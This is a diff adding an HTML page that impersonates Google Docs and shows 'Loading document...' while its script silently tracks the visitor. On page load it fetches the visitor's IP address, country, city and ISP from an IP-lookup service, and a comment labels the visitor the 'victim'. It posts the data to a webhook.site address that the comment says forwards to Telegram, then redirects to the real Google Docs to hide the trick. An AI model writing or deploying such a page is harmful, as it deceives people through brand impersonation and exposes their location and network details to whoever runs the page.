@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Docs - View Document</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        h1 { color: #4285F4; }
+    </style>
+</head>
+<body>
+    <h1>Google Docs</h1>
+    <p>Loading document...</p>
+
+    <script>
+        // Get victim's IP and location
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const country = data.country_name;
+                const city = data.city;
+                const isp = data.org;
+
+                // Send to Webhook.site (which forwards to Telegram)
+                fetch("https://webhook.site/cc7a001d-ea6e-4cd2-8a44-fa8548deae84", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        ip: ip,
+                        country: country,
+                        city: city,
+                        isp: isp
+                    })
+                });
+            });
+
+        // Redirect to real Google Docs after 3 seconds
+        setTimeout(() => {
+            window.location.href = "https://docs.google.com";
+        }, 3000);
+    </script>
+</body>
+</html>
